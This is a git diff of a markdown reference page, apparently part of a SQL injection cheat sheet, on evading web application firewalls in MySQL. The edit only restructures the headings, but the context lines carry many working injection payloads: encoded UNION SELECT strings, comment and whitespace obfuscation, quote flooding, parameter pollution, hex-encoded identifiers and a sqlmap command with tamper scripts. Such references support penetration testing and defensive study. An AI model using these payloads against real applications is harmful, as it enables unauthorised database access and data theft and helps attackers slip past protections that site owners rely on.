@@ -7,11 +7,9 @@ tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
 lastUpdated: 2025-12-15
 ---
 
-## Fuzzing and Obfuscation
-
 Modern web applications often employ Web Application Firewalls (WAFs) and other security measures to detect and block SQL injection attempts. Fuzzing and obfuscation techniques can help bypass these protections by disguising SQL injection payloads.
 
-### Comment Variations
+## Comment Variations
 
 MySQL supports various comment styles that can be inserted between SQL tokens (keywords, identifiers, operators), but cannot split tokens themselves (e.g., `SEL/**/ECT` is invalid).
 
@@ -30,11 +28,11 @@ SELECT /* comment */ username FROM users
 SELECT /*! username */ FROM users
 ```
 
-### Whitespace Manipulation
+## Whitespace Manipulation
 
 MySQL is generally flexible with whitespace, allowing creative formatting.
 
-#### Allowed Intermediary Characters (Whitespace Alternatives)
+### Allowed Intermediary Characters (Whitespace Alternatives)
 
 These characters can substitute for spaces in MySQL queries:
 
@@ -55,7 +53,7 @@ These characters can substitute for spaces in MySQL queries:
 '%0A%09UNION%0CSELECT%0BNULL%20%23
 ```
 
-#### Characters Allowed After AND/OR
+### Characters Allowed After AND/OR
 
 These characters can immediately follow `AND` or `OR` without spaces:
 
@@ -84,7 +82,7 @@ These characters can immediately follow `AND` or `OR` without spaces:
 1 AND!0
 ```
 
-#### Parentheses as Whitespace Alternatives
+### Parentheses as Whitespace Alternatives
 
 Parentheses can replace spaces around keywords and function calls:
 
@@ -99,7 +97,7 @@ SELECT(username)FROM(users)WHERE(id=1)
 (SELECT(username)FROM(users))
 ```
 
-#### Whitespace Examples
+### Whitespace Examples
 
 ```sql
 -- Using tabs, newlines, and carriage returns
@@ -115,7 +113,7 @@ SELECT%0Busername%0CFROM%0Busers
 SELECT       username       FROM       users
 ```
 
-### Case Variation
+## Case Variation
 
 MySQL keywords are case-insensitive, but identifier case-sensitivity depends on the operating system:
 
@@ -133,7 +131,7 @@ SeLeCt username FrOm users WhErE id=1
 
 This means `SELECT * FROM USERS` may fail on Linux if the table was created as `users`.
 
-### Operator Alternatives
+## Operator Alternatives
 
 Many MySQL operators have alternative representations:
 
@@ -152,7 +150,7 @@ id=1
 id<=>1
 ```
 
-### String Representation
+## String Representation
 
 Strings can be represented in multiple ways:
 
@@ -170,7 +168,7 @@ SELECT * FROM users WHERE username = CONCAT('ad', 'min')
 SELECT * FROM users WHERE username = CONCAT(LOWER('AD'), LOWER('MIN'))
 ```
 
-### Numeric Representation
+## Numeric Representation
 
 Numbers can be represented in various ways:
 
@@ -188,7 +186,7 @@ SELECT * FROM users WHERE id = 0x1 -- hex for 1
 SELECT * FROM users WHERE id = 1e0
 ```
 
-### Function Call Obfuscation
+## Function Call Obfuscation
 
 Function names can be obfuscated:
 
@@ -202,7 +200,7 @@ PREPARE stmt FROM @x;
 EXECUTE stmt;
 ```
 
-### UNION Query Obfuscation
+## UNION Query Obfuscation
 
 UNION attacks can be obfuscated:
 
@@ -222,9 +220,9 @@ UNION attacks can be obfuscated:
 - MySQL 5.7: Requires FROM clause (use `FROM dual`) when using WHERE
 - MySQL 8.0+: WHERE without FROM is allowed (`SELECT 1 WHERE 1=1` works)
 
-### Encoding Bypasses
+## Encoding Bypasses
 
-#### URL Encoding
+### URL Encoding
 
 ```text
 -- Standard URL encoding (RFC 3986)
@@ -242,7 +240,7 @@ UNION attacks can be obfuscated:
 
 **Note on `%uXXXX` encoding:** This is a legacy JavaScript escape format (`escape()`/`unescape()`), not RFC 3986 compliant. Modern servers don't reliably interpret it, but it may still work for WAF bypasses due to inconsistent decoding across layers (browser URL bar, proxy, WAF, application server). Standard Unicode in URLs uses UTF-8 percent-encoding (e.g., `é` = `%C3%A9`).
 
-#### Comment Obfuscation with Newlines
+### Comment Obfuscation with Newlines
 
 Using newlines within comment sequences to bypass pattern matching:
 
@@ -263,9 +261,9 @@ UNION SELECT 1,2,3' AND active=1
 
 The `#` comments out the rest of line 1, `AND 0--` is commented out by the preceding `#`, and `UNION SELECT` executes. The trailing `' AND active=1` becomes part of the commented/ignored portion. This breaks up the payload across multiple lines, evading single-line pattern matching by WAFs that scan line-by-line.
 
-### Keyword Bypass Techniques
+## Keyword Bypass Techniques
 
-#### Spaces in Identifiers
+### Spaces in Identifiers
 
 MySQL allows spaces around dots in qualified names:
 
@@ -275,7 +273,7 @@ information_schema . tables
 information_schema . columns
 ```
 
-#### Backtick Escaping
+### Backtick Escaping
 
 Use backticks to quote identifiers:
 
@@ -285,7 +283,7 @@ Use backticks to quote identifiers:
 `information_schema`.`columns`
 ```
 
-#### Version-Specific Execution
+### Version-Specific Execution
 
 Wrap SQL in executable comments (MySQL-specific extension):
 
@@ -297,7 +295,7 @@ Wrap SQL in executable comments (MySQL-specific extension):
 /*!50000 SELECT */ * FROM users
 ```
 
-#### Symbol Spam
+### Symbol Spam
 
 Using valid arithmetic operators to confuse WAFs:
 
@@ -307,7 +305,7 @@ Using valid arithmetic operators to confuse WAFs:
 1 AND -+--+--+~~((1))
 ```
 
-#### Quote Flooding
+### Quote Flooding
 
 Using excessive quotes to bypass WAFs that count quotes:
 
@@ -316,16 +314,16 @@ Using excessive quotes to bypass WAFs that count quotes:
 SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';
 ```
 
-### Advanced MySQL-specific Bypasses
+## Advanced MySQL-specific Bypasses
 
-#### Using Information Schema
+### Using Information Schema
 
 ```sql
 -- Alternative to 'users' table name
 SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_name LIKE 0x7573657273 LIMIT 1)x -- 'users' in hex
 ```
 
-#### HTTP Parameter Pollution
+### HTTP Parameter Pollution
 
 Some WAFs can be bypassed by splitting the payload across multiple parameters:
 
@@ -333,9 +331,9 @@ Some WAFs can be bypassed by splitting the payload across multiple parameters:
 ?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3
 ```
 
-### Practical Examples
+## Practical Examples
 
-#### Bypassing Simple Keyword Filters
+### Bypassing Simple Keyword Filters
 
 If 'SELECT' is blocked:
 
@@ -352,7 +350,7 @@ SELECT%09username%0AFROM%0Dusers
 
 **Note:** String concatenation (`CONCAT('SEL','ECT')`) cannot be used to construct SQL keywords. Keywords must appear literally in the query; they cannot be dynamically built from strings.
 
-#### Bypassing WAF Pattern Recognition
+### Bypassing WAF Pattern Recognition
 
 If basic injection patterns are blocked:
 
@@ -364,7 +362,7 @@ If basic injection patterns are blocked:
 1 AND 0x1=0x1 UNION SELECT UNHEX('73656C65637420757365726E616D652066726F6D20757365727320')
 ```
 
-### Automated Fuzzing
+## Automated Fuzzing
 
 Tools like SQLMap include fuzzing capabilities to automatically test various bypass techniques:
 
@@ -372,7 +370,7 @@ Tools like SQLMap include fuzzing capabilities to automatically test various byp
 sqlmap --url="http://target/page.php?id=1" --tamper=space2comment,charencode --random-agent
 ```
 
-### Mitigation
+## Mitigation
 
 To protect against obfuscation techniques:
 
